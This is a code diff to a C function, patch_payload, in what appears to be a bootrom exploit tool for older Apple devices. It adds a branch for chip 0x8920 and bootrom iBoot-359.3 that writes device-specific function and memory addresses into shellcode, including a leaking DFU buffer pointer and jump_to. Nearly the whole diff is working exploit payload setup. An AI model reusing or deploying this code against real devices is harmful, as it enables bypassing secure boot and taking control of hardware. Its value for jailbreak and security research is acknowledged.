@@ -71,7 +71,37 @@ static int patch_payload(io_client_t client)
         *(uint32_t*)(shellcode + i + 0x48) =     0x412d; // image3_create_struct
         *(uint32_t*)(shellcode + i + 0x4c) =     0x46db; // image3_load_continue
         *(uint32_t*)(shellcode + i + 0x50) =     0x47db; // image3_load_fail
+    } if(client->devinfo.cpid == 0x8920) {
+        if(!strcmp(client->devinfo.srtg, "iBoot-359.3")){
+            DEBUGLOG("[%s] oldBR", __FUNCTION__);
+            exploit_lr = 0x84033fa4;
+            *(uint32_t*)(shellcode + i + 0x00) = 0x84031800; // RELOCATE_SHELLCODE_ADDRESS
+            *(uint32_t*)(shellcode + i + 0x04) =       1024; // RELOCATE_SHELLCODE_SIZE
+            *(uint32_t*)(shellcode + i + 0x08) =     0x83d4; // memmove
+            *(uint32_t*)(shellcode + i + 0x0c) = 0x84034000; // MAIN_STACK_ADDRESS
+            *(uint32_t*)(shellcode + i + 0x10) =     0x43c9; // nor_power_on
+            *(uint32_t*)(shellcode + i + 0x14) =     0x5ded; // nor_init
+            *(uint32_t*)(shellcode + i + 0x18) = 0x84024820; // gUSBSerialNumber
+            *(uint32_t*)(shellcode + i + 0x1c) =     0x8e7d; // strlcat
+            *(uint32_t*)(shellcode + i + 0x20) =     0x349d; // usb_wait_for_image
+            *(uint32_t*)(shellcode + i + 0x24) = 0x84000000; // LOAD_ADDRESS
+            *(uint32_t*)(shellcode + i + 0x28) =    0x24000; // MAX_SIZE
+            *(uint32_t*)(shellcode + i + 0x2c) = 0x84024228; // gLeakingDFUBuffer
+            *(uint32_t*)(shellcode + i + 0x30) =     0x1ccd; // free
+            *(uint32_t*)(shellcode + i + 0x34) =     0x1f79; // memz_create
+            *(uint32_t*)(shellcode + i + 0x38) =     0x3969; // jump_to
+            *(uint32_t*)(shellcode + i + 0x3c) =     0x1fa1; // memz_destroy
+            *(uint32_t*)(shellcode + i + 0x40) =       0x60; // IMAGE3_LOAD_SP_OFFSET
+            *(uint32_t*)(shellcode + i + 0x44) =       0x50; // IMAGE3_LOAD_STRUCT_OFFSET
+            *(uint32_t*)(shellcode + i + 0x48) =     0x1fe5; // image3_create_struct
+            *(uint32_t*)(shellcode + i + 0x4c) =     0x2655; // image3_load_continue
+            *(uint32_t*)(shellcode + i + 0x50) =     0x277b; // image3_load_fail
+        } else {
+            // todo
+            return -1;
+        }
     } else {
+        // s5l8922: todo
         return -1;
     }
     
